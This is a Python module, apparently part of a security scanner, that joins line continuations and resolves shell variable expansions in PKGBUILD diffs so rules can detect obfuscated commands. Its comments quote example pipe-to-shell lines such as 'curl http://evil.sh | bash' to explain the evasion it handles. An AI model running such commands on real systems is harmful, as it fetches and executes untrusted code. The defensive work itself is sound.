import re

_MAX_EXPANSION_DEPTH = 8
_MAX_EXPANSION_PASSES = 16

# Innermost ${...} = one containing no further "${"
_INNERMOST_RE = re.compile(r"\$\{([^{}]*)\}")


def _glob_to_regex(pat: str) -> re.Pattern:
    """Translate a bash glob pattern to a regex.  Bash character classes
    and metacharacters are translated; everything else is escaped so that
    dots, hyphens, etc. are literals rather than regex operators."""
    out: list[str] = []
    i = 0
    while i < len(pat):
        c = pat[i]
        if c == "*":
            out.append(".*")
        elif c == "?":
            out.append(".")
        elif c == "[":
            j = pat.find("]", i + 1)
            if j == -1:
                out.append(re.escape(c))
            else:
                cls = pat[i + 1 : j]
                if cls.startswith("!"):
                    cls = "^" + cls[1:]
                out.append("[" + cls + "]")
                i = j
        else:
            out.append(re.escape(c))
        i += 1
    return re.compile("".join(out))


def _strip_affix(val: str, op: str, pat: str) -> str:
    """Apply bash ## / # / %% / % stripping using glob patterns."""
    regex = _glob_to_regex(pat)
    if op == "##":
        m = regex.search(val)
        return val[m.end() :] if m else val
    if op == "#":
        m = regex.match(val)
        return val[m.end() :] if m else val
    if op == "%%":
        # find the LAST match of the glob
        matches = list(regex.finditer(val))
        if not matches:
            return val
        return val[: matches[-1].start()]
    if op == "%":
        m = regex.search(val)
        if not m:
            return val
        return val[: m.start()]
    return val


def _expand_one(body: str, vars_: dict[str, str]) -> str | None:
    """Resolve a single innermost ${...} body.

    *body* is the content between ${ and } — all nested expansions have
    already been resolved at this point, so no further ${...} remains.

    Returns None (unresolved) for forms we refuse to evaluate.
    """
    # Indirect expansion and length: never resolve.
    if body.startswith("!") or body.startswith("#"):
        return None

    # //pat/rep  |  //pat  (delete)  |  /pat/rep
    m = re.match(r"^(\w+)(//|/)([^/]*)(?:/(.*))?$", body)
    if m:
        name, mode, pat, rep = m.group(1), m.group(2), m.group(3), m.group(4) or ""
        val = vars_.get(name)
        if val is None:
            return None
        regex = _glob_to_regex(pat)
        if mode == "//":
            return regex.sub(rep, val)
        return regex.sub(rep, val, count=1)

    # ##pat  #pat  %%pat  %pat
    m = re.match(r"^(\w+)(##|#|%%|%)(.*)$", body)
    if m:
        name, op, pat = m.group(1), m.group(2), m.group(3)
        val = vars_.get(name)
        if val is None:
            return None
        return _strip_affix(val, op, pat)

    # :-default  /  :=default
    m = re.match(r"^(\w+):([-=])(.*)$", body)
    if m:
        name, _, default = m.group(1), m.group(2), m.group(3)
        return vars_.get(name) or default

    # :offset:length  /  :offset
    m = re.match(r"^(\w+):(\d+)(?::(\d+))?$", body)
    if m:
        name, off, length = m.group(1), m.group(2), m.group(3)
        val = vars_.get(name)
        if val is None:
            return None
        return val[int(off) : int(off) + int(length)] if length else val[int(off) :]

    # plain variable reference
    if re.fullmatch(r"\w+", body):
        return vars_.get(body)

    return None


def resolve_expansions(text: str, vars_: dict[str, str]) -> tuple[str, bool]:
    """Resolve nested ${...} parameter expansions innermost-first.

    Returns (resolved_text, fully_resolved).
    fully_resolved is False if any ${...} remains after the cap — the caller
    MUST treat that as unresolved, never as a literal value.
    """
    sub_calls = 0

    def _resolve_once(t: str) -> str:
        nonlocal sub_calls
        m = _INNERMOST_RE.search(t)
        if m is None:
            return t
        replacement = _expand_one(m.group(1), vars_)
        if replacement is None:
            return t
        sub_calls += 1
        return t[: m.start()] + replacement + t[m.end() :]

    all_resolved = True
    for _ in range(_MAX_EXPANSION_PASSES):
        before = text
        m = _INNERMOST_RE.search(text)
        if m is None:
            return text, all_resolved and "${" not in text
        replacement = _expand_one(m.group(1), vars_)
        if replacement is None:
            all_resolved = False
        else:
            text = text[: m.start()] + replacement + text[m.end() :]
        if text == before:
            return text, all_resolved and "${" not in text
    return text, False


def _substitute_with_resolve(text: str, var_table: dict[str, str]) -> tuple[str, bool]:
    """Resolve $var and ${var...} references in *text*, returning
    (resolved, fully_resolved)."""
    # First resolve simple ${var} and $var.
    resolved = _VAR_REF_RE.sub(
        lambda m: var_table.get(m.group(1) or m.group(2), m.group(0)),
        text,
    )
    if len(resolved) > _MAX_LINE_LEN:
        return text, False
    # Then resolve parameter expansions (${var//pat/rep}, etc.).
    if "${" in resolved:
        resolved, ok = resolve_expansions(resolved, var_table)
        if not ok or len(resolved) > _MAX_LINE_LEN:
            return text, False
    return resolved, True


def join_line_continuations(lines: list[str]) -> list[str]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    # Accumulated as parts and joined once.  Appending to a string per
    # continuation line made this quadratic, so a diff of many backslash
    # continuations (which an untrusted PKGBUILD controls) cost time
    # proportional to the square of its length.
    parts: list[str] | None = None
    marker = ""

    def flush() -> str:
        return "".join(parts)

    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if parts is not None and this_marker == marker:
            parts.append(" " + body.strip())
        else:
            if parts is not None:
                out.append(marker + flush())
            parts, marker = [body], this_marker
        tail = parts[-1]
        if tail.rstrip().endswith("\\"):
            parts[-1] = tail.rstrip()[:-1].rstrip()
        else:
            out.append(marker + flush())
            parts, marker = None, ""
    if parts is not None:
        out.append(marker + flush())
    return out


# Assignments are frequently indented (every one inside a function body
# is) and may be introduced by a declaration keyword.  Anchoring on the
# bare name meant the variable table stayed empty for function bodies,
# so `C=curl; $C evil | bash` never resolved and defeated every rule
# that matches resolved strings.
_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*=\s*(.+)"
)


_VAR_REF_RE = re.compile(r"\$\{(\w+)\}|\$(\w+)")


# Substitution is iterated, and each round can double a value that refers
# to itself twice (``b=$a$a``).  A chain of such assignments expands as
# 2**depth, so a 517-byte PKGBUILD was enough to exhaust a gigabyte and
# have the process OOM-killed.  Since the input is by definition an
# untrusted package, expansion is bounded on three axes: how large one
# value may grow, how large a single resolved line may grow, and how much
# the table may hold in total.  A value that would exceed its bound is
# left unexpanded rather than truncated: an unresolved "$payload" is
# reported as an unresolved pattern, whereas a truncated one would look
# like a fully resolved string with its tail silently removed.
_MAX_VALUE_LEN = 8192
_MAX_LINE_LEN = 65536
_MAX_TABLE_BYTES = 1 << 20


def _substitute(text: str, var_table: dict[str, str], limit: int = _MAX_LINE_LEN) -> str:
    """resolve variable references in text using a variable table"""
    def replacer(match: re.Match) -> str:
        """look up the matched variable in the table"""
        var = match.group(1) or match.group(2)
        return var_table.get(var, match.group(0))

    result = _VAR_REF_RE.sub(replacer, text)
    if len(result) > limit:
        return text
    if "${" in result:
        result, _ok = resolve_expansions(result, var_table)
        if len(result) > limit:
            return text
    return result


def _variable_table(additions: list[str]) -> dict[str, str]:
    """Resolve assignments among added lines into ``{name: value}``."""
    var_table: dict[str, str] = {}
    for line in additions:
        match = _ASSIGNMENT_RE.match(line)
        if not match:
            continue
        value = match.group(2).strip()
        if (value.startswith('"') and value.endswith('"')) or (
            value.startswith("'") and value.endswith("'")
        ):
            value = value[1:-1]
        # A command substitution has no static value, so it cannot be
        # folded into the table.
        if "$(" not in value and "`" not in value:
            var_table[match.group(1)] = value

    for _ in range(10):
        new_table: dict[str, str] = {}
        for k, v in var_table.items():
            substituted, _ = _substitute_with_resolve(v, var_table)
            new_table[k] = substituted if len(substituted) <= _MAX_VALUE_LEN else v
        if new_table == var_table:
            break
        var_table = new_table
        if sum(len(v) for v in var_table.values()) > _MAX_TABLE_BYTES:
            break
    return var_table


def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    lines = join_line_continuations(diff_text.splitlines())
    var_table = _variable_table(
        [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
    )
    resolved_lines = []
    for line in lines:
        if line.startswith("+"):
            r, _ok = _substitute_with_resolve(line[1:], var_table)
            resolved_lines.append("+" + r)
        else:
            resolved_lines.append(line)
    return resolved_lines


def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    """Tokenize a diff and resolve variable references in added lines."""
    additions = []
    for line in join_line_continuations(diff_text.splitlines()):
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)

    var_table = _variable_table(additions)

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    unresolved_candidates = [
        line for line in additions
        if not (
            (m := _ASSIGNMENT_RE.match(line))
            and "$(" not in m.group(2)
            and "`" not in m.group(2)
        )
    ]

    resolved = []
    unresolved_out = []
    for line in unresolved_candidates:
        r, ok = _substitute_with_resolve(line, var_table)
        resolved.append(r)
        if not ok or r == line:
            unresolved_out.append(line)
    return resolved, unresolved_out